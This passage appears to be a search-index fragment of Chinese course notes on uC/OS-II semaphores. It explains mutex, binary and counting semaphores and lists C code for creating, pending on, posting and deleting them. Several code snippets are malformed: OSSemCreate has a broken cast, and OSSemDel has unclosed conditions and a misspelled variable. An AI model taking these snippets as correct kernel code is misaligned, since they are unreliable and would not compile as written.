= OS_NO_ERR; return ((OS_EVENT*)0); default: *err = OS_ERR_INVALID_OPT; return (pevent); } } \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"6.uCos\u4e2d\u7684\u4fe1\u53f7\u91cf\u673a\u5236"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/6.uCos%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E9%87%8F%E6%9C%BA%E5%88%B6/#ucos","text":"","title":"uCos\u4e2d\u7684\u4fe1\u53f7\u91cf\u673a\u5236"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/6.uCos%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E9%87%8F%E6%9C%BA%E5%88%B6/#_1","text":"uCos\u4e2d\u7684\u4fe1\u53f7\u91cf\u673a\u5236 \u76ee\u5f55 1. \u80cc\u666f 2. \u6982\u8ff0 2.1. \u4e3b\u8981\u673a\u5236\u53ca\u5e94\u7528 2.2. \u540c\u6b65\u6216\u901a\u4fe1\u7684\u57fa\u672c\u65b9\u5f0f 3. \u4fe1\u53f7\u91cf 3.1. \u4e3b\u8981\u673a\u5236\u53ca\u5e94\u7528 3.2. \u5206\u7c7b 3.3. \u4e92\u65a5\u4fe1\u53f7\u91cf 3.3.1. \u5d4c\u5957(\u9012\u5f52)\u8d44\u6e90\u8bbf\u95ee 3.3.2. \u5220\u9664\u5b89\u5168 3.4. \u5404\u79cd\u4e92\u65a5\u673a\u5236\u7684\u6bd4\u8f83 3.5. \u4e8c\u503c\u4fe1\u53f7\u91cf 3.6. \u8ba1\u6570\u4fe1\u53f7\u91cf 4. uC/OS-II\u4e2d\u5b9e\u73b0 4.1. \u521b\u5efa\u4fe1\u53f7\u91cf 4.2. \u83b7\u53d6(\u7533\u8bf7)\u4fe1\u53f7\u91cf 4.3. \u91ca\u653e\u4fe1\u53f7\u91cf 4.4. \u5220\u9664\u4fe1\u53f7\u91cf","title":"\u76ee\u5f55"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/6.uCos%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E9%87%8F%E6%9C%BA%E5%88%B6/#1","text":"\u524d\u6bb5\u65f6\u95f4\u8001\u5e08\u4e0a\u8bfe\u8bb2\u5230\u4e86uC/OS\u4e2d\u7684\u4fe1\u53f7\u91cf\u673a\u5236\uff0c\u6240\u4ee5\u6211\u60f3\u8981\u7ed3\u5408 \u300a\u03bcC/OS-III\u6e90\u7801\u5206\u6790\u7b14\u8bb0\u300b \u548c\u4e2d\u56fd\u5927\u5b66MOOC-\u7535\u5b50\u79d1\u6280\u5927\u5b66 \u300a\u5d4c\u5165\u5f0f\u7cfb\u7edf\u53ca\u5e94\u7528\u300b PPT\u5199\u4e00\u7bc7\u7b14\u8bb0\u5bf9\u8fd9\u90e8\u5206\u7684\u5185\u5bb9\u8fdb\u884c\u603b\u7ed3\u3002","title":"1. \u80cc\u666f"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/6.uCos%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E9%87%8F%E6%9C%BA%E5%88%B6/#2","text":"","title":"2. \u6982\u8ff0"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/6.uCos%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E9%87%8F%E6%9C%BA%E5%88%B6/#21","text":"\\text{Figure 1. \u6a21\u578b} \u5728\u5355\u5904\u7406\u5668\u5e73\u53f0\u4e0a\uff0c\u5d4c\u5165\u5f0f\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u63d0\u4f9b\u7684\u540c\u6b65\u3001\u4e92\u65a5\u4e0e\u901a\u4fe1\u673a\u5236 \u4e3b\u8981\u5305\u62ec\uff1a \u4fe1\u53f7\u91cf \uff08semaphore\uff09\uff0c\u7528\u4e8e\u4e92\u65a5\u4e0e\u540c\u6b65\u3002 \u4e8b\u4ef6\uff08\u7ec4\uff09 \uff08event group\uff09\uff0c\u7528\u4e8e\u540c\u6b65\u3002 \u90ae\u7bb1 \uff08mailbox\uff09\u3001\u6d88\u606f\u961f\u5217\uff08message queue\uff09\uff0c\u7528\u4e8e\u6d88\u606f\u901a\u4fe1\u3002 \u5f02\u6b65\u4fe1\u53f7 \uff08asynchronous signal\uff09\uff0c\u7528\u4e8e\u540c\u6b65\u3002 \u7ba1\u9053 \uff08pipe\uff09\uff0c\u63d0\u4f9b\u975e\u7ed3\u6784\u5316\u6570\u636e\u4ea4\u6362\uff08\u901a\u4fe1\uff09\u548c\u5b9e\u73b0\u540c\u6b65\u3002 \u5355\u5904\u7406\u5668\u6216\u591a\u5904\u7406\u5668\u7cfb\u7edf\u4e2d\uff0c\u8fd8\u6709\u5176\u5b83\u4e00\u4e9b\u673a\u5236\u4e5f\u53ef\u7528\u4e8e\u540c\u6b65\u4e0e\u901a\u4fe1\uff1a \u5168\u5c40\u53d8\u91cf \u5171\u4eab\u5185\u5b58 Sockets \u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\uff08Remote Procedure Call\uff09","title":"2.1. \u4e3b\u8981\u673a\u5236\u53ca\u5e94\u7528"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/6.uCos%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E9%87%8F%E6%9C%BA%E5%88%B6/#22","text":"\\text{Figure 2. \u540c\u6b65\u6216\u901a\u4fe1\u7684\u57fa\u672c\u65b9\u5f0f}","title":"2.2. \u540c\u6b65\u6216\u901a\u4fe1\u7684\u57fa\u672c\u65b9\u5f0f"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/6.uCos%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E9%87%8F%E6%9C%BA%E5%88%B6/#3","text":"","title":"3. \u4fe1\u53f7\u91cf"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/6.uCos%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E9%87%8F%E6%9C%BA%E5%88%B6/#31","text":"\u5728\u5355\u5904\u7406\u5668\u5e73\u53f0\u4e0a\uff0c\u5d4c\u5165\u5f0f\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u63d0\u4f9b\u7684\u540c\u6b65\u3001\u4e92\u65a5\u4e0e\u901a\u4fe1\u673a\u5236 \u4e3b\u8981\u5305\u62ec: \u4fe1\u53f7\u91cf (semaphore)\uff0c\u7528\u4e8e\u4e92\u65a5\u4e0e\u540c\u6b65\u3002 \u4e8b\u4ef6(\u7ec4) (event group)\uff0c\u7528\u4e8e\u540c\u6b65\u3002 \u90ae\u7bb1 (mailbox)\u3001 \u6d88\u606f\u961f\u5217 (message queue)\uff0c\u7528\u4e8e\u6d88\u606f\u901a\u4fe1\u3002 \u5f02\u6b65\u4fe1\u53f7 (asynchronous signal)\uff0c\u7528\u4e8e\u540c\u6b65\u3002 \u7ba1\u9053 (pipe)\uff0c\u63d0\u4f9b\u975e\u7ed3\u6784\u5316\u6570\u636e\u4ea4\u6362(\u901a\u4fe1)\u548c\u5b9e\u73b0\u540c\u6b65\u3002 \u5355\u5904\u7406\u5668\u6216\u591a\u5904\u7406\u5668\u7cfb\u7edf\u4e2d\uff0c\u8fd8\u6709\u5176\u5b83\u4e00\u4e9b\u673a\u5236\u4e5f\u53ef\u7528\u4e8e\u540c\u6b65\u4e0e\u901a\u4fe1: \u5168\u5c40\u53d8\u91cf\u3001\u5171\u4eab\u5185\u5b58\u3001Sockets\u3001\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528(Remote Procedure Call)\u3002","title":"3.1. \u4e3b\u8981\u673a\u5236\u53ca\u5e94\u7528"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/6.uCos%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E9%87%8F%E6%9C%BA%E5%88%B6/#32","text":"\u4fe1\u53f7\u91cf\u7528\u4e8e\u5b9e\u73b0\u4efb\u52a1\u4e0e\u4efb\u52a1\u4e4b\u95f4\u3001\u4efb\u52a1\u4e0e\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u4e4b\u95f4\u7684\u540c\u6b65\u4e0e \u4e92\u65a5\u3002\u4fe1\u53f7\u91cf\u4e00\u822c\u5206\u4e3a\u4e09\u79cd: \u4e92\u65a5\u4fe1\u53f7\u91cf:\u7528\u4e8e\u89e3\u51b3\u4e92\u65a5\u95ee\u9898\uff0c\u53ef\u80fd\u4f1a\u5f15\u8d77\u4f18\u5148\u7ea7\u53cd\u8f6c\u95ee\u9898\u3002 \u4e8c\u503c\u4fe1\u53f7\u91cf:\u7528\u4e8e\u89e3\u51b3\u540c\u6b65\u95ee\u9898 \u8ba1\u6570\u4fe1\u53f7\u91cf:\u7528\u4e8e\u89e3\u51b3\u8d44\u6e90\u8ba1\u6570\u95ee\u9898","title":"3.2. \u5206\u7c7b"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/6.uCos%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E9%87%8F%E6%9C%BA%E5%88%B6/#33","text":"\u7528\u4e92\u65a5\u4fe1\u53f7\u91cf\u4fdd\u62a4\u7684\u4ee3\u7801\u533a\u79f0\u4f5c \u4e34\u754c\u533a \uff0c\u4e34\u754c\u533a\u4ee3\u7801\u901a\u5e38\u7528 \u4e8e\u5bf9\u5171\u4eab\u8d44\u6e90\u7684\u8bbf\u95ee\u3002 \u5171\u4eab\u8d44\u6e90 \u53ef\u80fd\u662f\u4e00\u6bb5\u5b58\u50a8\u5668\u7a7a\u95f4\u3001\u4e00\u4e2a\u6570\u636e\u7ed3\u6784\u6216I/O\u8bbe\u5907\uff0c\u4e5f \u53ef\u80fd\u662f\u88ab\u4e24\u4e2a\u6216\u591a\u4e2a\u5e76\u53d1\u4efb\u52a1\u5171\u4eab\u7684\u4efb\u4f55\u5185\u5bb9\u3002 \u4f7f\u7528 \u4e92\u65a5\u4fe1\u53f7\u91cf\u53ef\u4ee5\u5b9e\u73b0\u5bf9\u5171\u4eab\u8d44\u6e90\u7684\u4e32\u884c\u8bbf\u95ee \uff0c\u4fdd\u8bc1\u53ea\u6709\u6210\u529f \u5730\u83b7\u53d6\u4e92\u65a5\u4fe1\u53f7\u91cf\u7684\u4efb\u52a1\u624d\u80fd\u591f\u91ca\u653e\u5b83\u3002 \u4e92\u65a5\u4fe1\u53f7\u91cf\u57fa\u672c\u7279\u70b9:\u4e92\u65a5\u4fe1\u53f7\u91cf\u7684\u503c\u88ab\u521d\u59cb\u5316\u62101\uff0c\u6700\u591a\u53ea\u6709 \u4e00\u4e2a\u4efb\u52a1\u53ef\u4ee5\u8fdb\u5165 \u4e34\u754c\u533a \u3002 \\text{Figure 3. \u4e92\u65a5\u4fe1\u53f7\u91cf\u72b6\u6001\u56fe} \u4e92\u65a5\u4fe1\u53f7\u91cf\u662f\u4e00\u79cd \u7279\u6b8a \u7684\u4e8c\u503c\u4fe1\u53f7\u91cf\uff0c\u4e00\u822c\u5b83 \u652f\u6301\u6240\u6709\u6743\u3001\u9012\u5f52\u8bbf \u95ee\u3001\u4efb\u52a1\u5220\u9664\u5b89\u5168 \u548c\u4e00\u4e9b\u907f\u514d \u4f18\u5148\u7ea7\u53cd\u8f6c\u3001\u9965\u997f\u3001\u6b7b\u9501\u7b49 \u4e92\u65a5\u6240\u56fa \u6709\u95ee\u9898\u7684\u534f\u8bae\u3002 \u6240\u6709\u6743 :\u5f53\u4e00\u4e2a\u4efb\u52a1\u901a\u8fc7\u83b7\u53d6\u4e92\u65a5\u4fe1\u53f7\u91cf\u800c\u5c06\u5176\u9501\u5b9a\u65f6\uff0c\u5f97\u5230\u8be5\u4e92 \u65a5\u4fe1\u53f7\u91cf\u7684\u6240\u6709\u6743\u3002\u76f8\u53cd\uff0c\u5f53\u4e00\u4e2a\u4efb\u52a1\u91ca\u653e\u4fe1\u53f7\u91cf\u65f6\uff0c\u5931\u53bb\u5bf9\u5176\u7684 \u6240\u6709\u6743\u3002","title":"3.3. \u4e92\u65a5\u4fe1\u53f7\u91cf"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/6.uCos%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E9%87%8F%E6%9C%BA%E5%88%B6/#331","text":"\u5d4c\u5957(\u9012\u5f52)\u8d44\u6e90\u8bbf\u95ee :\u5982\u679cTask1\u8c03\u7528RoutineA\uff0c\u800cRoutineA \u53c8\u8c03\u7528RoutineB\uff0c\u5e76\u4e14\u4e09\u8005\u8bbf\u95ee\u76f8\u540c\u7684\u5171\u4eab\u8d44\u6e90\uff0c\u5c31\u53d1\u751f\u4e86\u9012\u5f52\u5171 \u4eab\u8d44\u6e90\u7684\u8bbf\u95ee\u540c\u6b65\u95ee\u9898\u3002 \u4e00\u4e2a\u9012\u5f52\u7684 \u4e92\u65a5\u4fe1\u53f7\u91cf\u5141\u8bb8\u5d4c\u5957\u9501\u5b9a \u4e92\u65a5\u4fe1\u53f7\u91cf\uff0c\u800c\u4e0d\u5f15\u8d77\u6b7b\u9501\u3002 \u6bcf\u4e2a\u83b7\u53d6\u4fe1\u53f7\u91cf\u7684\u8c03\u7528\u5fc5\u987b\u4e0e\u91ca\u653e\u4fe1\u53f7\u91cf\u7684 \u8c03\u7528\u76f8\u5339\u914d \u3002 \u7528\u4e8e \u540c\u6b65\u7684\u4fe1\u53f7\u91cf\u4e0d\u652f\u6301\u5d4c\u5957\u8bbf\u95ee \uff0c\u5426\u5219\u4efb\u52a1\u4f1a\u88ab\u6c38\u4e45\u963b\u585e\u3002","title":"3.3.1. \u5d4c\u5957(\u9012\u5f52)\u8d44\u6e90\u8bbf\u95ee"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/6.uCos%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E9%87%8F%E6%9C%BA%E5%88%B6/#332","text":"\u5220\u9664\u5b89\u5168 :\u5728\u4e00\u4e2a\u53d7\u4fe1\u53f7\u91cf\u4fdd\u62a4\u7684\u4e34\u754c\u533a\uff0c\u7ecf\u5e38\u9700\u8981\u4fdd\u62a4\u5728\u4e34\u754c\u533a\u6267\u884c\u7684\u4efb\u52a1\u4e0d\u4f1a\u88ab\u610f\u5916\u5730\u5220\u9664\u3002 \u5220\u9664\u4e00\u4e2a\u5728\u4e34\u754c\u533a\u6267\u884c\u7684\u4efb\u52a1\u53ef\u80fd\u5f15\u8d77\u610f\u60f3\u4e0d\u5230\u7684\u540e\u679c\uff0c\u9020\u6210\u4fe1\u53f7\u91cf\u4e0d\u53ef\u7528\u6216\u8d44\u6e90\u7834\u574f\u3002 \u89e3\u51b3\u65b9\u6cd5 :\u63d0\u4f9b \u4efb\u52a1\u4fdd\u62a4 \u548c \u89e3\u9664\u4efb\u52a1\u4fdd\u62a4 \u539f\u8bed\u5bf9\u3002","title":"3.3.2. \u5220\u9664\u5b89\u5168"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/6.uCos%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E9%87%8F%E6%9C%BA%E5%88%B6/#34","text":"\\text{Figure 4. \u5404\u79cd\u4e92\u65a5\u673a\u5236\u7684\u6bd4\u8f83}","title":"3.4. \u5404\u79cd\u4e92\u65a5\u673a\u5236\u7684\u6bd4\u8f83"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/6.uCos%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E9%87%8F%E6%9C%BA%E5%88%B6/#35","text":"\u4e8c\u503c\u4fe1\u53f7\u91cf\u4e3b\u8981\u7528\u4e8e\u4efb\u52a1\u4e0e\u4efb\u52a1\u4e4b\u95f4\u3001\u4efb\u52a1\u4e0e\u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\u4e4b\u95f4\u7684 \u540c\u6b65\u3002\u4e8c\u503c\u4fe1\u53f7\u91cf\u7684\u521d\u59cb\u503c\u4e3a0\uff0c\u8868\u793a\u540c\u6b65\u4e8b\u4ef6\u5c1a\u672a\u4ea7\u751f\u3002 \\text{Figure 5. \u4e8c\u503c\u4fe1\u53f7\u91cf\u72b6\u6001\u56fe} \u7528\u4e8c\u503c\u4fe1\u53f7\u91cf\u5b9e\u73b0\u4efb\u52a1\u95f4\u53cc\u5411\u540c\u6b65\u65f6\uff0c\u7533\u8bf7\u8005\u548c\u91ca\u653e\u8005\u4e0d\u662f\u540c\u4e00\u4e2a\u4efb\u52a1\uff0c\u4e0e\u4e92\u65a5\u4fe1\u53f7\u91cf\u4e0d\u540c\u3002\u4e92\u65a5\u4fe1\u53f7\u91cf\u5fc5\u987b\u8c01\u7533\u8bf7\uff0c\u8c01\u91ca\u653e\u3002 \\text{Figure 6. \u7528\u4e8c\u503c\u4fe1\u53f7\u91cf\u5b9e\u73b0\u4efb\u52a1\u95f4\u53cc\u5411\u540c\u6b65}","title":"3.5. \u4e8c\u503c\u4fe1\u53f7\u91cf"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/6.uCos%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E9%87%8F%E6%9C%BA%E5%88%B6/#36","text":"\u8ba1\u6570\u4fe1\u53f7\u91cf\u7528\u4e8e\u63a7\u5236\u7cfb\u7edf\u4e2d\u5171\u4eab\u8d44\u6e90\u7684\u591a\u4e2a\u5b9e\u4f8b\u7684\u4f7f\u7528\uff0c\u5141\u8bb8\u591a\u4e2a \u4efb\u52a1\u540c\u65f6\u8bbf\u95ee\u540c\u4e00\u79cd\u8d44\u6e90\u7684\u591a\u4e2a\u5b9e\u4f8b\u3002 \u8ba1\u6570\u4fe1\u53f7\u91cf\u88ab\u521d\u59cb\u5316\u4e3a\u4e00\u4e2a\u975e\u8d1f\u6574\u6570n\uff0c\u5373\u8be5\u79cd\u5171\u4eab\u8d44\u6e90\u7684\u6570\u76ee\u3002 \\text{Figure 7. \u8ba1\u6570\u4fe1\u53f7\u91cf\u72b6\u6001\u56fe} \\text{Figure 8. \u6709\u754c\u7f13\u51b2\u95ee\u98981} \\text{Figure 9. \u6709\u754c\u7f13\u51b2\u95ee\u9898}","title":"3.6. \u8ba1\u6570\u4fe1\u53f7\u91cf"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/6.uCos%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E9%87%8F%E6%9C%BA%E5%88%B6/#4-ucos-ii","text":"","title":"4. uC/OS-II\u4e2d\u5b9e\u73b0"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/6.uCos%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E9%87%8F%E6%9C%BA%E5%88%B6/#41","text":"OS_EVENT* OSSemCreate(INT16U cnt) { OS_EVENT* pevent; pevent = OSEventFreeList; //\u4ece\u7a7a\u95f2\u4e8b\u4ef6\u63a7\u5236\u5757\u94fe\u4e2d\u53d6\u5f97\u4e00\u4e2aECB if (OSEventFreeList != (OS_EVENT*)0) { OSEventFreeList = (OS_EVENT*) { OSEventFreeList->OSEventPtr; } if (pevent != (OS_EVENT*)0) { //\u521d\u59cb\u5316ECB\u7684\u5404\u4e2a\u57df pevent->OSEventType = OS_EVENT_TYPE_SEM; //\u4e8b\u4ef6\u7c7b\u578b\u4e3a\u4fe1\u53f7\u91cf //\u4fe1\u53f7\u91cf\u7684\u521d\u59cb\u8ba1\u6570\u503c pevent->OSEventCnt = cnt; pevent->OSEventPtr = (void*)0; OS_EventWaitListInit(pevent); //\u521d\u59cb\u5316\u7b49\u5f85\u4efb\u52a1\u5217\u8868 } } return (pevent); //\u8c03\u7528\u8005\u9700\u68c0\u67e5\u8fd4\u56de\u503c\uff0c\u5982\u679c\u4e3aNULL\u5219\u8868\u793a\u5efa\u7acb\u5931\u8d25 } \u8bf4\u660e\uff1a\u8fd9\u662f\u9488\u5bf9\u8ba1\u6570\u4fe1\u53f7\u91cf\u548c\u4e8c\u503c\u4fe1\u53f7\u91cf\u7684\u5b9e\u73b0\u3002 \u03bcC/OS-II\u4e2d\u4e92\u65a5 \u4fe1\u53f7\u91cf\u7684\u5b9e\u73b0\u53c2\u89c1\u6e90\u7801os_mutex.c\u6587\u4ef6\u3002 \\text{Figure 10. \u57fa\u672c\u6d41\u7a0b}","title":"4.1. \u521b\u5efa\u4fe1\u53f7\u91cf"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/6.uCos%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E9%87%8F%E6%9C%BA%E5%88%B6/#42","text":"void OSSemPend(OS_EVENT* pevent, INT16U timeout, INT8U* err) { //\u4fe1\u53f7\u91cf\u503c\u5927\u4e8e0\uff0c\u6210\u529f\u83b7\u5f97\u4fe1\u53f7\u91cf\u5e76\u8fd4\u56de if (pevent->OSEventCnt > 0) { pevent->OSEventCnt--; *err = OS_NO_ERR; return; } //\u8bbe\u7f6e\u4efb\u52a1\u72b6\u6001\u4e3a\u7b49\u5f85\u4fe1\u53f7\u91cf OSTCBCur->OSTCBStat |= OS_STAT_SEM; //\u8bbe\u7f6e\u7b49\u5f85\u65f6\u9650 OSTCBCur->OSTCBDly = timeout; //\u5c06\u4efb\u52a1\u653e\u7f6e\u5230\u4fe1\u53f7\u91cf\u7684\u7b49\u5f85\u5217\u8868\u4e2d OS_EventTaskWait(pevent); //\u5185\u6838\u5b9e\u65bd\u4efb\u52a1\u8c03\u5ea6\uff0c\u7cfb\u7edf\u5207\u6362\u5230\u53e6\u4e00\u5c31\u7eea\u4efb\u52a1\u6267\u884c OS_Sched(); //\u5224\u65ad\u4efb\u52a1\u6062\u590d\u6267\u884c\u7684\u539f\u56e0\uff0c\u5982\u679c\u7b49\u5f85\u65f6\u9650\u8d85\u65f6\u4f46\u4ecd\u7136\u672a\u83b7\u5f97\u4fe1\u53f7\u91cf\uff0c\u5219\u8fd4\u56de\u8d85\u65f6\u4fe1\u606f if (OSTCBCur->OSTCBStat & OS_STAT_SEM) { OSEventTO(pevent); *err = OS_TIMEOUT; return; } OSTCBCur->OSTCBEventPtr = (OS_EVENT*)0; *err = OS_NO_ERR; //\u4efb\u52a1\u7531\u4e8e\u83b7\u5f97\u4fe1\u53f7\u91cf\u800c\u6062\u590d\u6267\u884c\uff0c\u672c\u8c03\u7528\u6210\u529f\u8fd4\u56de } \u8bf4\u660e\uff1a\u8fd9\u91cc\u540c\u6837\u662f\u9488\u5bf9\u8ba1\u6570\u4fe1\u53f7\u91cf\u548c\u4e8c\u503c\u4fe1\u53f7\u91cf\u7684\u5b9e\u73b0\u3002 OSSemAccept \u4e5f\u53ef\u4ee5\u5b9e\u73b0\u83b7\u53d6(\u7533\u8bf7)\u4fe1\u53f7\u91cf\u7684\u529f\u80fd\u3002 INT16U OSSemAccept(OS_EVENT* pevent) { INT16U cnt; cnt = pevent->OSEventCnt; if (cnt > 0) { pevent->OSEventCnt--; } return (cnt); } \u529f\u80fd\uff1a\u65e0\u7b49\u5f85\u7684\u83b7\u53d6\u6216\u7533\u8bf7\u4e00\u4e2a\u4fe1\u53f7\u91cf\u3002 \u6ce8\u610f\uff1a\u5373\u4f7f\u4e0d\u80fd\u6210\u529f\u83b7\u5f97\u4fe1\u53f7\u91cf(\u8fd4\u56de\u503c\u4e3a0)\uff0c\u8c03\u7528\u8005\u4e5f\u4e0d \u4f1a\u88ab\u963b\u585e\u3002\u6b64\u51fd\u6570 \u53ef\u4ee5\u5728\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u4e2d\u4f7f\u7528 \u3002","title":"4.2. \u83b7\u53d6(\u7533\u8bf7)\u4fe1\u53f7\u91cf"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/6.uCos%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E9%87%8F%E6%9C%BA%E5%88%B6/#43","text":"\\text{Figure 12. \u91ca\u653e\u4fe1\u53f7\u91cf} INT8U OSSemPost(OS_EVENT* pevent) { if (pevent->OSEventGrp != 0x00) { //\u5982\u679c\u6709\u4efb\u52a1\u5728\u7b49\u5f85\u8be5\u4fe1\u53f7\u91cf OS_EventTaskRdy(pevent, (void*)0, OS_STAT_SEM); //\u4f7f\u7b49\u5f85\u5217\u8868\u4e2d\u4f18\u5148\u7ea7\u6700\u9ad8\u7684\u4efb\u52a1\u5c31\u7eea OS_Sched(); //\u5185\u6838\u5b9e\u65bd\u4efb\u52a1\u8c03\u5ea6 return (OS_NO_ERR); //\u6210\u529f\u8fd4\u56de } if (pevent->OSEventCnt < 65535) { //\u5982\u679c\u6ca1\u6709\u4efb\u52a1\u7b49\u5f85\u8be5\u4fe1\u53f7\u91cf\uff0c\u5e76\u4e14\u4fe1\u53f7\u91cf\u7684\u503c\u672a\u6ea2\u51fa pevent->OSEventCnt++; //\u4fe1\u53f7\u91cf\u7684\u503c\u52a01 return (OS_NO_ERR); //\u6210\u529f\u8fd4\u56de } return (OS_SEM_OVF); //\u4fe1\u53f7\u91cf\u6ea2\u51fa }","title":"4.3. \u91ca\u653e\u4fe1\u53f7\u91cf"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/6.uCos%E4%B8%AD%E7%9A%84%E4%BF%A1%E5%8F%B7%E9%87%8F%E6%9C%BA%E5%88%B6/#44","text":"\\text{Figure 13. \u5220\u9664\u4fe1\u53f7\u91cf} OS_EVENT* OSSemDel(OS_EVENT* pevent, INT8U opt, INT8U* err) { BOOLEAN tasks_waiting; if(pevent->OSEventGrp!=0x00{//\u6839\u636e\u662f\u5426\u6709\u4efb\u52a1\u5728\u7b49\u5f85\u4fe1\u53f7\u91cf\u8bbe\u7f6e\u7b49\u5f85\u6807\u5fd7 tasks_waiting = TRUE; }else{ tasks_waiting = FALSE; } switch(opt){ case OS_DEL_NO_PEND: //\u5982\u679c\u6709\u4efb\u52a1\u7b49\u5f85\u4fe1\u53f7\u91cf\u5219\u4e0d\u5220\u9664\u4fe1\u53f7\u91cf if(task_waiting==FALSE{ //\u6ca1\u6709\u4efb\u52a1\u7b49\u5f85\uff0c\u91ca\u653eECB\u56de\u7a7a\u95f2\u94fe pevent->OSEventType = OS_EVENT_TYPE_UNUSED; pevent->OSEventPtr = OSEventFreeList; OSEventFreeList = pevent; //\u8c03\u6574\u7a7a\u95f2ECB\u94fe\u5934\u6307\u9488 *err = OS_NO_ERR; return ((OS_EVENT)0); }else{ *err = OS_ERR_TASK_WAITING; //\u6709\u4efb\u52a1\u7b49\u5f85\uff0c\u5220\u9664\u4fe1\u53f7\u91cf\u5931\u8d25 return (pevent); } case OS_DEL_ALWAYS: //\u65e0\u8bba\u6709\u65e0\u4efb\u52a1\u7b49\u5f85\u90fd\u5220\u9664\u4fe1\u53f7\u91cf //\u5c06\u7b49\u5f85\u5217\u8868\u4e2d\u7684\u6bcf\u4e2a\u4efb\u52a1\u90fd\u8bbe\u7f6e\u6210\u5c31\u7eea while (pevent->OSEventGrp != 0x00) { OS_EventTaskRdy(pevent, (void*)0, 